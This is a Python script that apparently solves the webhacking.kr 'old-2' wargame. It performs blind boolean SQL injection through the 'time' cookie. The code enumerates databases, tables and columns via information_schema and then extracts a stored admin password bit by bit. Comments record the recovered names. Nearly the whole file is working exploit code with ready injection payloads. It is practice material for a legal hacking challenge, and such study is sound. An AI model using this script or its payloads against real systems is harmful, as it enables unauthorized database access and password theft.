#https://eine.tistory.com/entry/webhackingkr-old-2%EB%B2%88
import urllib.request
import requests

req = urllib.request
url = 'https://webhacking.kr/challenge/web-02/'

PHPSESSID = ''
time = ''

response = req.urlopen(url)
status = response.getheaders()
for s in status:
    print(s)
for s in status:
    if s[1][:10] == "PHPSESSID=":
        tmp = list(map(str, s[1].split()))
        PHPSESSID = tmp[0][10:-1]
    if s[1][:5] == "time=":
        tmp = list(map(str, s[1].split()))
        time = tmp[0][5:-1]

print(PHPSESSID, time)

cookies = {"time":time,"PHPSESSID":PHPSESSID}

# response = requests.get(url=url,cookies=cookies)
# print(response.text)

# cookies['time'] = time + " and 1=1"
# response = requests.get(url=url,cookies=cookies)
# print(response.text)

# cookies['time'] = time + " and 1=2"
# response = requests.get(url=url,cookies=cookies)
# print(response.text)

db_indexs = []
for db_index in range(0,3):
    for i in range(50):
        payload = "and (select length(table_schema) from information_schema.tables order by table_schema limit {},1) = {}".format(db_index,i)
        cookies['time'] = time + " " + payload
        response = requests.get(url, cookies=cookies)
        if "2070-01-01 09:00:01" in response.text:
            db_indexs.append([db_index,i])
            break
db_indexs.remove(db_indexs[0])
def findDB_name(db_index,db_len):
    name = ""
    for name_index in range(db_len):
        bincar = ""
        for bit_index in range(1,8):
            payload = "and (select substr(lpad(bin(ascii(substr(table_schema,{},1))),7,0 ),{},1) from information_schema.tables order by table_schema limit {},1) = 1".format(name_index+1,bit_index,db_index)
            cookies['time'] = time + " " + payload
            response = requests.get(url,cookies=cookies)
            if "2070-01-01 09:00:01" in response.text:
                bincar += "1"
            else:
                bincar += "0"
        name += chr(int(bincar,2))
    return name
for db in db_indexs:
    print(findDB_name(db[0],db[1]))
############################################
# db_name ; chall2
############################################

db_name = "chall2"
def findtable_length(db_name,tb_index):
    for i in range(50):
        payload = "and (select length(table_name) from information_schema.tables where table_schema = '{}' order by table_name limit {},1) = {}".format(db_name,tb_index,i)
        cookies['time'] = time + " " + payload
        response = requests.get(url,cookies=cookies) 
        if "2070-01-01 09:00:01" in response.text: 
            return i
table_len = []
for i in range(2):
    tmp = findtable_length(db_name,i)
    table_len.append(tmp)
    print(tmp)
#########################
# len 0 table : 13
# len 1 table : 3
#########################

def findtable_name(db_name,tb_index,tb_len):
    name = "" 
    for name_index in range(tb_len):
        bincar = ""
        for bit_index in range(1,8):
            payload = "and (select substr(lpad(bin(ascii(substr(table_name,{},1))),7,0 ),{},1) from information_schema.tables where table_schema = '{}' order by table_name limit {},1) = 1".format(name_index+1,bit_index,db_name,tb_index)
            cookies['time'] = time + " " + payload
            response = requests.get(url,cookies=cookies)
            if "2070-01-01 09:00:01" in response.text:
                bincar += "1"
            else:
                bincar += "0"
        name += chr(int(bincar,2))
    return name
for i in range(2):
    print(findtable_name(db_name, i, table_len[i]))

#############################
# name 0 table : admin_area_pw
# name 1 table : log
#############################
col_index = 0
tb_name = "admin_area_pw"
def findcolumn_length(db_name,tb_name,col_index):
    for i in range(50):
        payload = "and (select length(column_name) from information_schema.columns where table_schema = '{}' and table_name = '{}' order by column_name limit {},1) = {}".format(db_name,tb_name,col_index,i)
        cookies['time'] = time + " " + payload
        response = requests.get(url,cookies=cookies)
        if "2070-01-01 09:00:01" in response.text:
            return i
print(findcolumn_length(db_name, tb_name, col_index))
###########
# 1st column len = 2
###########
col_len = 2
def findcolumn_name(db_name,tb_name,col_index,col_len):
    name = ""
    for name_index in range(col_len):
        bincar = ""
        for bit_index in range(1,8):
            payload = "and (select substr(lpad(bin(ascii(substr(column_name,{},1))),7,0 ),{},1) from information_schema.columns where table_schema = '{}' and table_name = '{}' order by column_name limit {},1) = 1".format(name_index+1,bit_index,db_name,tb_name,col_index)
            cookies['time'] = time + " " + payload
            response = requests.get(url,cookies=cookies)
            if "2070-01-01 09:00:01" in response.text:
                bincar += "1"
            else:
                bincar += "0"
        name += chr(int(bincar,2))
    return name
print(findcolumn_name(db_name, tb_name, col_index, col_len))

###########
# 1st column name = "pw"
###########
col_name = "pw"
val_index = 0
def findvalue_length(db_name,tb_name,col_name,val_index):
    for i in range(50):
        payload = "and (select length({0}) from {1}.{2} order by {0} limit {3},1) = {4}".format(col_name,db_name,tb_name,val_index,i)
        cookies['time'] = time + " " + payload
        response = requests.get(url,cookies=cookies)
        if "2070-01-01 09:00:01" in response.text:
            return i
print(findvalue_length(db_name, tb_name, col_name, val_index))
val_len = 17

def findvalue_val(db_name,tb_name,col_name,val_index,val_len):
    name = ""
    for name_index in range(val_len):
        bincar = ""
        for bit_index in range(1,8):
            payload = "and (select substr(lpad(bin(ascii(substr({0},{1},1))),7,0 ),{2},1) from {3}.{4} order by {0} limit {5},1) = 1".format(col_name,name_index+1,bit_index,db_name,tb_name,val_index)
            cookies['time'] = time + " " + payload
            response = requests.get(url,cookies=cookies)
            if "2070-01-01 09:00:01" in response.text:
                bincar += "1"
            else:
                bincar += "0"
        name += chr(int(bincar,2))
    return name
print(findvalue_val(db_name,tb_name,col_name,val_index,val_len))